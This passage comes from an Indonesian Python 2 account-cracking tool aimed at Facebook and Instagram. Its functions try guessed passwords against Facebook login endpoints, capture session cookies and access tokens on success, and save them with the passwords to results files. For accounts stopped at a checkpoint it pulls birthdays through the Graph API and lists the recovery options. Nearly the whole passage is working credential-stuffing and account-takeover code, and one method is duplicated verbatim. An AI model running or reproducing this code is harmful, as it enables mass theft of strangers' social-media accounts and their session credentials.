                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        else:
                            pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
                        log.submit(self.mobhil, uid, pwx)
                    except: pass
            os.remove(self.apk)
            exit("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Crack Selesai >_")
        else:
            jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Wronk Input");self.langsung()
    
    def b_api(self, user, manual):
    	try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
#        	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        	ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
        global ok,cp,loop
        for pw in manual:
            pw = pw.lower()
            ses = requests.Session()
            header = {"user-agent": ua,
            "x-fb-connection-bandwidth": str(random.randint(20000,40000)),
            "x-fb-sim-hni": str(random.randint(20000,40000)),
            "x-fb-net-hni": str(random.randint(20000,40000)),
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
            "content-type": "application/x-www-form-urlencoded",
            "x-fb-http-engine": "Liger"}
            bapi = "https://b-api.facebook.com/method/auth.login"
            response = ses.get(bapi+'?format=json&email='+user+'&password='+pw+'&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header)
            if response.status_code != 200:
            	jeeck("\r\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Tolong hidupkam mode pesawat 2 detik"),
                sys.stdout.flush()
                loop +=1
                b_api(self, user, manual)
            if 'session_key' in response.text and 'EAAA' in response.text:
                print '\r %s*---> %s • %s • %s ' % (B,user,pw,response.json()['access_token'])
                ok.append('%s • %s • %s'%(user,pw,response.json()['access_token']))
                open('OK/%s.txt'%(waktu), 'a').write(' -->%s %s • %s • %s\n'%(B,user,pw,response.json()['access_token']))
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    jeeckxd = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,jeeckxd)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan12[month]
                    print '\r %s*---> %s • %s • %s %s %s  ' % (K,user,pw,day,month,year)
                    
                    cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
                    open('CP/%s.txt' %(waktu), 'a').write(" --> %s • %s • %s %s %s\n"% (user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except: pass
                print ('\r %s*---> %s • %s            '%(K,user,pw))
                
                cp.append('%s • %s'%(user,pw))
                open('CP/%s.txt' %(waktu), 'a').write(" --> %s • %s\n" % (user,pw))
                break
                continue
        loop += 1
        print('\r%s [Proses]%s %s/%s [OK:%s] <--> [CP:%s]'%(B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    
    def basic(self, user, manual):
        try:
    	    ua = open('data/ua.txt', 'r').read()
        except IOError:
        	ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
        global ok,cp,loop
        for pw in manual:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" %(key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s*---> %s • %s • %s  '%(B,user,pw,kuki))
                
                ok.append('%s • %s • %s'%(user,pw,kuki))
                open('OK/%s.txt'%(waktu), 'a').write(' --> %s • %s • %s\n'%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    jeeckxd = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,jeeckxd)).json()['birthday']
                    day, month, year = lahir.split('/')
                    month = bulan12[month]
                    print ('\r %s*---> %s • %s • %s %s %s '%(K,user,pw,day,month,year))
                    
                    cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
                    open('CP/%s.txt' %(waktu), 'a').write(" --> %s • %s • %s %s %s\n"% (user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except:pass
                print ('\r %s*---> %s • %s            '%(K,user,pw))
                
                cp.append('%s • %s'%(user,pw))
                open('CP/%s.txt' %(waktu), 'a').write(" --> %s • %s\n" % (user,pw))
                break
                continue
                
        loop += 1
        print('\r%s [Proses]%s %s/%s [OK:%s]<––>[CP:%s]'%(B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
    
    # MOBILE
    def mobil(self, user, manual):
    	global ok,cp,loop
        for pw in manual:
            pw = pw.lower()
            try:
            	ua = open('data/ua.txt', 'r').read()
            except IOError:
            	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com/index.php")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for _mi_ in b('input'):
            	if _mi_.get('value') is None:
            	    if _mi_.get('name') == 'email':
            	        data.update({"email":user})
                    elif _mi_.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({_mi_.get('name'): ''})
                else:
                	data.update({_mi_.get('name'): _mi_.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd','__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" %(key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s*---> %s • %s • %s  '%(B,user,pw,kuki))
                #aplikasi(berhasil,kuki)
                ok.append('%s • %s • %s'%(user,pw,kuki))
                open('OK/%s.txt'%(waktu), 'a').write(' --> %s • %s • %s\n'%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    day, month, year = lahir.split('/')
                    month = bulan12[month]
                    print ('\r %s*---> %s • %s • %s %s %s '%(K,user,pw,day,month,year))
                    cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
                    open('CP/%s.txt' %(waktu), 'a').write(" --> %s • %s • %s %s %s\n"% (user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except:pass
                print ('\r %s*---> %s • %s            '%(K,user,pw))
                cp.append('%s • %s'%(user,pw))
                open('CP/%s.txt' %(waktu), 'a').write(" --> %s • %s\n" % (user,pw))
                break
                continue
                
        loop += 1
        print('\r%s [Proses]%s %s/%s [OK:%s] <---> [CP:%s]'%(B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        
    # MOBILE
    def mobil(self, user, manual):
    	global ok,cp,loop
        for pw in manual:
            pw = pw.lower()
            try:
            	ua = open('data/ua.txt', 'r').read()
            except IOError:
            	ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com/index.php")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for _mi_ in b('input'):
            	if _mi_.get('value') is None:
            	    if _mi_.get('name') == 'email':
            	        data.update({"email":user})
                    elif _mi_.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({_mi_.get('name'): ''})
                else:
                	data.update({_mi_.get('name'): _mi_.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd','__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" %(key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\r %s*---> %s • %s • %s  '%(B,user,pw,kuki))
                #aplikasi(berhasil,kuki)
                ok.append('%s • %s • %s'%(user,pw,kuki))
                open('OK/%s.txt'%(waktu), 'a').write(' --> %s • %s • %s\n'%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('data/token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    day, month, year = lahir.split('/')
                    month = bulan12[month]
                    print ('\r %s*---> %s • %s • %s %s %s '%(K,user,pw,day,month,year))
                    cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
                    open('CP/%s.txt' %(waktu), 'a').write(" --> %s • %s • %s %s %s\n"% (user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                    year  = ''
                except:pass
                print ('\r %s*---> %s • %s            '%(K,user,pw))
                cp.append('%s • %s'%(user,pw))
                open('CP/%s.txt' %(waktu), 'a').write(" --> %s • %s\n" % (user,pw))
                break
                continue
                
        loop += 1
        print('\r%s [Proses]%s %s/%s [OK:%s] <---> [CP:%s]'%(B,P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
def jeeck_log(user, pw, opsi_):
    ua = "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for _i_ in fm.find_all("input"):
        if i.get("name") in list:
            data.update({_i_.get("name"):_i_.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pw})
    try:
        run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("%s• redirect overload "%(M))
    if "c_user" in ses.cookies:
        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
        run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
        otw = ses.get(run,cookies={'cookie':kuki})
        gem = parser(otw.content,'html.parser')
        apk = gem.find('form',method='post')
        print("%s%s Berhasill <>  %s "%(B,til,kuki));jeda(0.07)
        _no_ = 0
        for app in apk.find_all("h3"):
        	data = app.find('span')
        	_no_+=1
        	jalan("  %s0%s. %s%s "%(P,str(_no_),H,data))
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
        xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        opsi_cek = []
        for _o_ in range(len(ngew)):
            opsi_cek.append("\n  %s0%s. %s%s "%(P,str(_o_+1),K,ngew[_o_]))
        print(opsi_+"".join(opsi_cek))
    elif "login_error" in str(run):
        pass
    else:
        pass
#\033[0;36m
def jeeck_cp():
    dirs = os.listdir('CP')
    
    for file in dirs:
        print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m --> \033[0;36m%s "%(file))
    try:
    	print("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file ( contoh : \033[0;36m%s \033[0;00m) --> \033[0;33mhasil hari ini : \033[0;36m%s "%(waktu,waktu))
    	opsi()
    	
    
    except NameError:
        jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m File Not Faund ");exit()
def opsi():
	CP = ("CP/")
	jeeckxtampan = raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Name File : ")
	if jeeckxtampan == "":
		jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk Input");jeda(2);opsi()
	try:
		jeeck_cp = open(CP+jeeckxtampan, "r").readlines()
	except IOError:
		exit("\n%s[%s+%s] nama file %s tidak tersedia"%(B,J,B,jeeckxtampan))
	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––")
	print("%s[%s+%s]%s Total Account %s: %s%s"%(B,J,B,P,M,P,len(jeeck_cp)));jeda(2)
	jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m –––––––––––––––––––[Panjul-Tzy]––––––––––––––––––––––––")
	for fb in jeeck_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" • ")
		print("\n%s[%s+%s]%s Mengecek akun > %s: %s%s"%(B,J,B,P,M,K,akun.replace(" --> ","")));jeda(0.07)
		try:
			mengecek(ngecek[0].replace(" --> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			pass
	print("\n%s[%s+%s] FINISED "%(B,J,B,));jeda(0.07)
	raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,));jeda(0.07)
	menu()
def mengecek(user, pw):
	mb = ("https://mbasic.facebook.com")
	ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36")
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "29-November-2021.txtmax-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for _i_ in fm.find_all("input"):
		if _i_.get("name") in list:
			data.update({_i_.get("name"):_i_.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pw})
	try:
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except requests.exceptions.TooManyRedirects:
		print("%s redirect overload "%(M))
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
		otw = ses.get(run,cookies={'cookie':kuki})
		gem = parser(otw.content,'html.parser')
		apk = gem.find('form',method='post')
		print("%s[%s+%s]%s Sucess --> %s "%(B,J,B,P,kuki));jeda(0.07)
		_no_ = 0
		for app in apk.find_all("h3"):
			data = app.find('span').text
			_no_+=1
			jalan("  %s0%s. %s%s "%(P,str(_no_),H,data))
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		sesi = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in sesi.find_all("option")]
		print("%s%s%s Terdeteksi %s0%s%s options %s "%(B,til,K,W,str(len(ngew)),O,M));jeda(0.07)
		for _o_ in range(len(ngew)):
			jalan("  %s0%s. %s%s "%(P,str(_o_+1),K,ngew[_o_]))
	elif "login_error" in str(run):
		eror = run.find("div",{"id":"login_error"}).find("div").text
		print("%s+ %s"%(B,eror));jeda(0.07)
	else:
		jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Login On Account Eror Or Password On Change");jeda(0.07)

def aplikasi(berhasil,kuki):
	a = []
	run = ("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active")
	otw = ses.get(run,cookies={'cookie':kuki})
	gem = parser(otw.content,'html.parser')
	apk = gem.find('form',method='post')
	_no_ = 0
	for app in apk.find_all("h3"):
		try:
			data = app.find('span').text
			_no_+=1
			a.append("  %s0%s. %s%s "%(P,str(_no_),H,data))
		except:
			pass
# ...lan

def menu_instagg():
	jeeck("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m========================-->\033[0;36m MENU INSTAGRAM ")
	print("\033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Crack dari followers publik")
	print("\033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Crack dari pencarian nama")
	print("\033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Chek results")
	print("\033[0;36m[\033[0;35m04\033[0;36m]\033[0;00m Log Out")
	print("\033[0;36m[\033[0;35m05\033[0;36m]\033[0;00m Back to menu")
	jeeclxnano = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
	if jeeclxnano in['']:
		jeeck("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m INPUT EROR");jeda(2);exit()
	elif jeeclxnano in['1','01']:
		pw = ""
		status = ""
		username = raw_input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Username target : ")
		ingfo(username, pw, status)
		jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m ✠═╬═══════════[ Panjul-Tzy ]══════════════✠");jeda(2)
#		print ('%s[%s+%] 01%s Follower %s=> %s%s'%(B,J,B,P,M,K,str(pengikut)))
		print("\033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Followers --> %s "%(str(pengikut)))
#		print ('%s[%s+%] 01%s Follow %s=> %s%s'%(B,J,B,P,M,K,str(mengikuti)))
		print("\033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Follow --> %s "%(str(mengikuti)))
		rm = raw_input("\n\n\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Input : ")
		limit = input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Limit user : ")
		if rm in['']:
			jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk Input : ")
		elif rm in['1','01']:
			r_ikut(cookie, idg, limit, rm) 
			print ""
			proses()
			passxnxx()
		elif rm in['2','02']:
			r_ikut(cookie, idg, limit, rm) 
			print""
			proses()
			passxnxx()
		else:
			print("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk Input Dear ");jeda(2);menu_instagg()
	elif jeeclxnano in['2','02']:
		usr_ = raw_input("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan nama : ")
		jumlah = input("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Limit : ")
		jeeckxnano_2 = usr_.replace(" ", "")
		cr.append("asw_lu")
		mi.append(jeeckxnano_2+"|"+jeeckxnano_2)
		mi.append(jeeckxnano_2+"_"+"|"+jeeckxnano_2)
		for _i_ in range(1, jumlah+1):
			mi.append(jeeckxnano_2+str(_i_)+"|"+jeeckxnano_2)
			mi.append(jeeckxnano_2+"_"+str(_i_)+"|"+jeeckxnano_2)
			mi.append(jeeckxnano_2+str(_i_)+"_"+"|"+jeeckxnano_2)
		proses()
		passxnxx()
	elif jeeclxnano in['3','03']:
		hasil_igeh()
	elif jeeclxnano in['04','4']:
		k = raw_input("\033[0;36m[\033[0;31m+\033[0;36m]\033[0;00m Type ,Jeeck, Continue Deleted Account : ")
		if k in ["JEECK", "jeeck", "Jeeck"]:
			print('')
			s = ['.   ', '..  ', '... ']
			for m in s:
				print '\r\x1b[1;95m╰_╯\x1b[1;96m Deleted Cooooook.......' + m,
				sys.stdout.flush();jeda(1)
			os.system('rm -rf data/ig.txt')
			jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Sucess Deleted Coooook......╰_╯");exit()
		else:
			jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Run Tools Doog");jeda(2)
	elif jeeclxnano in['0','00']:
		menu()
		
	else:
		jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Wronk Input Dooog .........");jeda(2);menu_instagg()

def author():
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Pembuat Tools : ")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m1. \033[0;36mSanz-Tzy (Panjul-Tzy)")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m2. \033[0;36mJeeck X Nano")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m3. \033[0;36mXxCode ")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m4. \033[0;36mYayan XD ")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m5. \033[0;36mRisky / Dumaii ")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Thanks Too : ")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m            \033[0;36m(\033[0;33m1. \033[0;36mXnCode ")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m            \033[0;36m(\033[0;33m2. \033[0;36mXxCode ")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m            \033[0;36m(\033[0;33m3. \033[0;36mYayan XD ")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m            \033[0;36m(\033[0;33m5. \033[0;36mRisky / Dumai ")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m FOLLOW GITHUB :")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m1. \033[0;36mYayan XD")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m+. https://github.com/Yayan-XD")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m2. \033[0;36mRisky / Dumaii")
         jalan("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m+. https://github.com/Dumai-991")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m3. \033[0;36mJEECK X NANO")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m                \033[0;36m(\033[0;33m+. https://github.com/mrjeeck")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;31m DONASI NJEENK :")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m               WA : 081392505882")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m               FB : Sanz-Tzy")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m               PULSA : 085891511849")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m               PULSA : 081392505882")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m               OPEN BO : xnxx.com")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m  JANGAN LUPA FOLLOW GITHUB AUTHOR")
         raw_input('\n%s[%s+%s] \033[0;33m[%s Enter \033[0;33m] '%(B,J,B,U,))
         menu()
def panduanxnano():
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;35m Menu Panduann Penggunaan")
         jeeck("\n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 1. Tools Ini Terdapat Beberapa Jenis menu")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 2. Anda Dapat Memilih Salah Satu Menu Tools")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 3. Tools Ini Terdapat Fitur Crcak Instagram")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 4. Dan Juga Ada Fitur Crack Facebook")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 5. Menu Crack Facebook Sangat Banyak Sekali Fitur")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 6. Dari Mulai Segi Dump Public Hingga Dump Group")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 7. Apa Itu Dump Id Public Bang...... ??")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 8. Public Yang Ya Dumpublic Dump Id Orang Secara Random")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 9. Dump Id group Maksudnya apa Bwank.....? Seriusnanya")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 10. Kita Dumpnya Ambil Id Dari Group Dan Kita Dapat MENGOBOKOBOKOBOK RANDOM MEMBER GROUP")
         jeeck("\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m 11. Bang Kalo Menu User Agent Fungsinya Buat Apa .....??")
